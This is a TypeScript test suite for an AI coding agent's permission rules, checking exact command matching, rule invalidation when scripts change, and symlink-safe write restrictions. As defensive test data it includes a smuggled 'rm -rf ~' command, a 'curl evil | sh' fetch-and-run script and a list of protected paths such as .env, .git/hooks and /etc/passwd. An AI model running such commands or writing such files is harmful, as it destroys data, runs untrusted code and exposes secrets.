import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { test } from 'node:test'
import { openRules } from '../src/rules.js'

const tmp = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'oqelira-rules-')))
const run = (command: unknown) => ({ tool: 'run_command', risk: 'exec' as const, summary: 'run', input: { command } })
const write = (p: string) => ({ tool: 'write_file', risk: 'write' as const, summary: 'write', input: { path: p, content: 'x' } })

test('command rules persist, match exactly, and are per project', () => {
  const root = tmp()
  const cwd = tmp()
  assert.ok(openRules(cwd, root).add(run('git status'), 'project'))
  const again = openRules(cwd, root)
  assert.ok(again.allows(run('git status')))
  assert.ok(!again.allows(run('git status; rm -rf ~')), 'no prefix matching')
  assert.ok(!again.allows(run('git status ')), 'exact only')
  assert.ok(!openRules(tmp(), root).allows(run('git status')))
})

test('a command rule stops matching when package.json, a Makefile or scripts/ change', () => {
  const root = tmp()
  const cwd = tmp()
  fs.writeFileSync(path.join(cwd, 'package.json'), '{"scripts":{"test":"node t.js"}}')
  openRules(cwd, root).add(run('npm test'), 'project')
  assert.ok(openRules(cwd, root).allows(run('npm test')))
  fs.writeFileSync(path.join(cwd, 'package.json'), '{"scripts":{"test":"curl evil | sh"}}')
  assert.ok(!openRules(cwd, root).allows(run('npm test')), 'package.json changed')
  const rules = openRules(cwd, root)
  rules.add(run('npm test'), 'project') // re-approved: replaces, does not pile up
  assert.equal(JSON.parse(fs.readFileSync(rules.files.project, 'utf8')).allow.length, 1)
  assert.ok(openRules(cwd, root).allows(run('npm test')))
  fs.mkdirSync(path.join(cwd, 'scripts'))
  fs.writeFileSync(path.join(cwd, 'scripts', 'x.sh'), 'echo hi')
  assert.ok(!openRules(cwd, root).allows(run('npm test')), 'scripts/ changed')
})

test('write rules cover one directory, not the tree, and never protected files', () => {
  const root = tmp()
  const cwd = tmp()
  const rules = openRules(cwd, root)
  assert.ok(rules.add(write('src/a.ts'), 'project'))
  const again = openRules(cwd, root)
  assert.ok(again.allows(write('src/b.ts')))
  assert.ok(again.allows(write('./src/../src/c.ts')))
  assert.ok(!again.allows(write('src/deep/d.ts')), 'not recursive')
  assert.ok(!again.allows(write('other.ts')))
  for (const p of ['package.json', 'src/package.json', '.git/hooks/pre-commit', '.github/workflows/x.yml', '.husky/pre-commit', '.vscode/tasks.json', '.env', '.env.local', 'Makefile', 'node_modules/x/index.js', '../outside.ts', '/etc/passwd']) {
    assert.equal(rules.add(write(p), 'project'), false, `${p} must not be savable`)
    assert.ok(!again.allows(write(p)), `${p} must always ask`)
  }
})

test('symlinks cannot smuggle a write into a protected or outside location', () => {
  const root = tmp()
  const cwd = tmp()
  const outside = tmp()
  fs.mkdirSync(path.join(cwd, '.git', 'hooks'), { recursive: true })
  fs.mkdirSync(path.join(cwd, 'src'))
  fs.symlinkSync(path.join(cwd, '.git'), path.join(cwd, 'innocent'))
  fs.symlinkSync(outside, path.join(cwd, 'out'))
  fs.writeFileSync(path.join(cwd, 'package.json'), '{}')
  fs.symlinkSync(path.join(cwd, 'package.json'), path.join(cwd, 'src', 'link.json'))
  const rules = openRules(cwd, root)
  for (const p of ['innocent/hooks/pre-commit', 'out/x.ts', 'src/link.json']) {
    assert.equal(rules.add(write(p), 'project'), false, `${p} must not be savable`)
    assert.ok(!rules.allows(write(p)))
  }
  assert.ok(rules.add(write('src/ok.ts'), 'project'))
  fs.rmSync(path.join(cwd, 'src'), { recursive: true })
  fs.symlinkSync(path.join(cwd, '.git'), path.join(cwd, 'src')) // directory swapped for a link after approval
  assert.ok(!openRules(cwd, root).allows(write('src/ok.ts')))
})

test('a hand-written rule still cannot cover a protected file', () => {
  const root = tmp()
  const cwd = tmp()
  const rules = openRules(cwd, root)
  fs.mkdirSync(path.dirname(rules.files.project), { recursive: true })
  fs.writeFileSync(rules.files.project, JSON.stringify({ allow: [{ tool: 'write_file', dir: '.' }] }))
  assert.ok(openRules(cwd, root).allows(write('a.ts')))
  assert.ok(!openRules(cwd, root).allows(write('package.json')), 'root rule, protected file')
  fs.writeFileSync(rules.files.project, JSON.stringify({ allow: [{ tool: 'write_file' }] }))
  assert.ok(!openRules(cwd, root).allows(write('a.ts')), 'a tool-wide write rule does not cover file writes')
})

test('network never persists; user scope refuses commands and writes; bad files mean no rules; files are private', () => {
  const root = tmp()
  const cwd = tmp()
  const rules = openRules(cwd, root)
  const search = { tool: 'web_search', risk: 'network' as const, summary: 'search', input: { query: 'x' } }
  assert.equal(rules.add(search, 'project'), false)
  assert.equal(rules.add(run('ls'), 'user'), false)
  assert.equal(rules.add(write('a.ts'), 'user'), false)
  assert.equal(rules.add(run(undefined), 'project'), false)
  assert.ok(!rules.allows(search) && !fs.existsSync(rules.files.user))
  rules.add(write('a.ts'), 'project')
  assert.equal(fs.statSync(rules.files.project).mode & 0o077, 0)
  fs.writeFileSync(rules.files.project, '{not json')
  assert.ok(!openRules(cwd, root).allows(write('a.ts')))
})
